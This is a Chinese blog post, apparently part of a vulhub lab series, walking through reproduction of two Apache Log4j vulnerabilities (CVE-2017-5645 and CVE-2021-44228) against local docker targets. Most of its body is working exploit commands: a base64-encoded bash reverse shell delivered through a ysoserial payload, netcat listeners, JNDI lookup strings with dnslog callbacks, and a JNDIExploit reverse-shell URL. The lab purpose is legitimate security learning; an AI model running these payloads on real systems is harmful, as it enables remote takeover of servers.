<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>（七）vulhub专栏：Log4j 反序列化、远程代码执行漏洞复现 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="（七）vulhub专栏：Log4j 反序列化、远程代码执行漏洞复现" />
<meta property="og:description" content="Log4j CVE-2017-5645反序列化漏洞 影响范围 Apache Log4j 2.x &lt;= 2.8.2
漏洞成因 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。
漏洞利用 环境准备 名称IP攻击机192.168.75.162靶机192.168.75.146 首先输入以下命令进入vulhub里启动靶场，然后在攻击机里访问http://192.168.75.146:8983即可
cd vulhub-master/log4j/CVE-2017-5645 docker-compose up -d 然后进入攻击机里使用nmap扫描全端口：
nmap -sS 192.168.75.146 -p 1-65535 -v 漏洞复现 首先准备好生成利用的工具：ysoserial.jar
工具验证漏洞是否存在 可以看出存在log4j漏洞
POC：
//反弹shell命令，注意替换为自己的 bash -i &gt;&amp; /dev/tcp/192.168.75.162/6666 0&gt;&amp;1 //base64加密 YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA&#43;JjE= 接下来新打开一个cmd窗口执行以下命令：
nc -lvvp 6666 监听启动后我们使用payload：
java -jar ysoserial.jar CommonsCollections5 &#34;bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA&#43;JjE=}|{base64,-d}|{bash,-i}&#34; | nc 192.168.75.146 4712 访问上述地址后，可以看到如下图，反弹shell成功，此漏洞利用成功
Log4j CVE-2021-44228远程代码执行漏洞 影响范围 Apache Log4j 2.x &lt;= 2.14.1
漏洞成因 Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/9092df0c2631150091b8d438dfc5ac71/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-25T15:30:47+08:00" />
<meta property="article:modified_time" content="2022-07-25T15:30:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">（七）vulhub专栏：Log4j 反序列化、远程代码执行漏洞复现</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="Log4j_CVE20175645_0"></a>Log4j CVE-2017-5645反序列化漏洞</h3> 
<h4><a id="_2"></a>影响范围</h4> 
<p>Apache Log4j 2.x &lt;= 2.8.2</p> 
<h4><a id="_6"></a>漏洞成因</h4> 
<p>Apache <a href="https://so.csdn.net/so/search?q=Log4j&amp;spm=1001.2101.3001.7020">Log4j</a>是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。</p> 
<h4><a id="_10"></a>漏洞利用</h4> 
<h5><a id="_12"></a>环境准备</h5> 
<table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>192.168.75.162</td></tr><tr><td>靶机</td><td>192.168.75.146</td></tr></tbody></table> 
<p>首先输入以下命令进入vulhub里启动靶场，然后在攻击机里访问http://192.168.75.146:8983即可</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> vulhub-master/log4j/CVE-2017-5645
<span class="token function">docker-compose</span> up -d
</code></pre> 
<p>然后进入攻击机里使用nmap扫描全端口：</p> 
<pre><code class="prism language-shell">nmap -sS <span class="token number">192.168</span>.75.146 -p <span class="token number">1</span>-65535 -v
</code></pre> 
<p><img src="https://images2.imgbox.com/49/4b/74y4JkHM_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="_35"></a>漏洞复现</h5> 
<p>首先准备好生成利用的工具：<strong>ysoserial.jar</strong></p> 
<h5><a id="_39"></a>工具验证漏洞是否存在</h5> 
<p><img src="https://images2.imgbox.com/20/bf/Wor5HOoP_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/4c/91/8KOFLubU_o.png" alt="在这里插入图片描述"></p> 
<p>可以看出存在log4j漏洞</p> 
<p>POC：</p> 
<pre><code class="prism language-shell">//反弹shell命令，注意替换为自己的
<span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.75.162/6666 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
//base64加密
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA+JjE<span class="token operator">=</span>
</code></pre> 
<p>接下来新打开一个cmd窗口执行以下命令：</p> 
<pre><code class="prism language-shell"><span class="token function">nc</span> -lvvp <span class="token number">6666</span>
</code></pre> 
<p>监听启动后我们使用payload：</p> 
<pre><code>java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}" | nc 192.168.75.146 4712
</code></pre> 
<p>访问上述地址后，可以看到如下图，<strong>反弹shell成功，此漏洞利用成功</strong></p> 
<p><img src="https://images2.imgbox.com/95/a5/cvTBrkCp_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="Log4j_CVE202144228_76"></a>Log4j CVE-2021-44228远程代码执行漏洞</h3> 
<h4><a id="_78"></a>影响范围</h4> 
<p>Apache Log4j 2.x &lt;= 2.14.1</p> 
<h4><a id="_82"></a>漏洞成因</h4> 
<p>Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p> 
<h4><a id="_86"></a>漏洞利用</h4> 
<h5><a id="_88"></a>环境准备</h5> 
<table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>192.168.75.162</td></tr><tr><td>靶机</td><td>192.168.75.146</td></tr></tbody></table> 
<p>首先输入以下命令进入vulhub里启动靶场，然后在攻击机里访问http://192.168.75.146:8983即可</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">cd</span> vulhub-master/log4j/CVE-2021-44228
<span class="token function">docker-compose</span> up -d
</code></pre> 
<p><img src="https://images2.imgbox.com/09/ab/PlYWNCmR_o.png" alt="image-20220721143339286"></p> 
<h5><a id="_104"></a>漏洞复现</h5> 
<p>首先准备好生成利用的工具：<strong>JNDIExploit-1.2-SNAPSHOT.jar</strong></p> 
<p>在利用漏洞之前，需要先判断目标是否出网，这里我们采用ceye来判断，也可以使用dnslog</p> 
<p>POC：#记得修改xxx.dnslog.cn为自己的，下方二选一</p> 
<pre><code class="prism language-shell"><span class="token variable">${jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>${sys<span class="token operator">:</span>java.version}</span>.xxx.dnslog.cn<span class="token punctuation">}</span>
<span class="token variable">${jndi<span class="token operator">:</span>rmi<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>${sys<span class="token operator">:</span>java.version}</span>.xxx.dnslog.cn<span class="token punctuation">}</span>
</code></pre> 
<p>然后访问链接：</p> 
<pre><code class="prism language-http">http://192.168.75.146:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
</code></pre> 
<p><img src="https://images2.imgbox.com/20/33/xYvKtbw8_o.png" alt="image-20220721145718365"></p> 
<p>接下来在ceye或dnslog端即可看见java版本信息了，如下图所示，若无信息返回，则代表不出网</p> 
<p><img src="https://images2.imgbox.com/69/41/XAXkzDSK_o.png" alt="image-20220721145902427"></p> 
<p>接下来我们通过准备好的利用工具，输入如下指令</p> 
<pre><code class="prism language-shell">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="token number">192.168</span>.75.162
</code></pre> 
<p>执行完上述命令会开启ldap和http服务，如下图所示：</p> 
<p><img src="https://images2.imgbox.com/25/99/qt2MT8S4_o.png" alt="image-20220721152200190"></p> 
<p>接下来新打开一个cmd窗口执行以下命令：</p> 
<pre><code class="prism language-shell"><span class="token function">nc</span> -lvvp <span class="token number">6666</span>
</code></pre> 
<p>监听启动后我们在浏览器输入：</p> 
<pre><code>http://192.168.75.146:8983/solr/admin/cores?action=${jndi:ldap://192.168.75.162:1389/Basic/ReverseShell/192.168.75.162/6666}
</code></pre> 
<p>访问上述地址后，可以看到如下图，<strong>反弹shell成功，此漏洞利用成功</strong></p> 
<p><img src="https://images2.imgbox.com/b9/dd/BWB7Nnzo_o.png" alt="image-20220721152316739"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0f085f51d7ed0725b8e223f2438c2391/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Web学习笔记8-【过滤器Filter：功能、使用方法、生命周期、使用场景，文件的上传，文件的下载】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f230a616f9ab3888b50086a4d7d54100/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【Linux碎知识点2】Linux查看操作系统信息</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>